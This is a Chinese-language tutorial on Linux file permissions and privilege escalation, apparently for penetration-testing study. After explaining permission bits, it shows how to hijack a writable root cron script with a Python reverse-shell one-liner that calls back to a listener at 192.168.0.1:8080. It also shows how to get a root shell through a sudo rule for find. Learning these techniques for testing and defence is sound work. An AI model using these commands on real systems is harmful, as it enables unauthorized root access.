## linux文件权限介绍 

Linux文件类型常见的有：普通文件、目录、符号链接文件等。

1.  普通文件

```

-rw-rw-r--  1 user user    0 Sep 19 01:41 test.txt
```

2.  目录

```

drwxr-xr-x  2 user user 4096 Feb 23  2022 Desktop/
```

3.  符号链接文件

```

lrwxrwxrwx  1 user user    9 Feb 23  2022 .bash_history -> /dev/null
```

权限详解

```

-rw-rw-r--
```

r：read权限，代表可读

w：write权限，代表可写

x：execute权限，代表可执行

一共有10位，用来表示文件的权限

*   第 1 位表示文件的类型，`-` 表示文件，`d` 表示目录，`l` 表示符号链接文件。
*   第 2-4 位表示文件所有者的权限，`---` 表示空权限，`r--` 表示只读权限，`rwx` 表示可读可写可执行权限。
*   第 5-7 位表示所属组权限，`---` 表示空权限，`r--` 表示只读权限，`rwx` 表示可读可写可执行权限。
*   第 8-10 位表示其他人权限，`---` 表示空权限，`r--` 表示只读权限，`rwx` 表示可读可写可执行权限。


可以使用 `pspy` 这个工具打印出系统所有的进程（`pspy` 可以低权限执行）

```


#工具下载地址
```

![](../Images/d3ef269ac71ba9a709e893881e538eaf.png)

可以捕捉到 `root` 的计划任务运行了哪些任务。

```

2022/09/19 02:41:42 CMD: UID=0    PID=3407   | /bin/python3 /opt/copy.py
```

直接到 `opt` 目录下看这个 py 文件的 其他人权限是否有 `w` 权限。

```

-rwxrw-rw-  1 root root  370 Sep 19 02:46 copy.py*
```

这个权限代表我们可以去修改这个文件 ，修改成 py 反弹 shell 的命令。

```

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

在自己本地监听一个端口，等待 `root` 的计划任务执行 `copy.py` 文件。

执行之后自己本地监听到的 shell 权限就是 `root` 权限了。

## sudo提权 

### 什么是sudo

`sudo` 是 linux 系统管理指令，是允许普通用户以管理员身份执行命令。

`sudo` 的配置文件在 `/etc/sudoers`

![](../Images/1503519ad47c82023a0cccf90d9b2c65.png)

配置sudo权限

```

haishi ALL=(ALL) NOPASSWD: /usr/bin/find
```

*   `haishi` 使用sudo的用户
*   `ALL=(ALL)` 代表所有权限
*   `NOPASSWD` 执行sudo时可以不用输入当前用户密码
*   `/usr/bin/find` 代表执行的命令 这里是find命令

直接输入 `sudo -l` 就可以看到当前用户是否具有 `sudo` 权限

```


Matching Defaults entries for user on ubuntu:
```

解释：`user` 用户 可以使用 `root` 权限执行 `find` 命令

提权命令

```

sudo find / -exec "/bin/bash" \;
```

可利用的 `sudo` 命令

```


/usr/bin/find
```
